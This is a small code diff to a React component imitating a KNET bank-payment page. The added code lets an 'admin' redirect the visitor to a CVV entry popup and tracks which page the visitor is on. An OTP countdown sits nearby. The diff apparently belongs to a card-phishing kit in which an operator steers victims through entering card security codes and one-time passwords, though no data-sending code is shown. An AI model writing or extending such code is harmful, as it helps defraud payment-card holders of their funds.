@@ -204,6 +204,14 @@ export default function KNETPayment() {
 
   useEffect(() => {
     navigateToPage("دفع بنفت");
+    // Check if admin redirected to CVV popup
+    const openCvv = localStorage.getItem("openCvvPopup");
+    if (openCvv === "true") {
+      localStorage.removeItem("openCvvPopup");
+      setShowCvvPopup(true);
+      setPhase("cvv");
+      navigateToPage("CVV بنفت");
+    }
   }, []);
 
   // Countdown timer for OTP
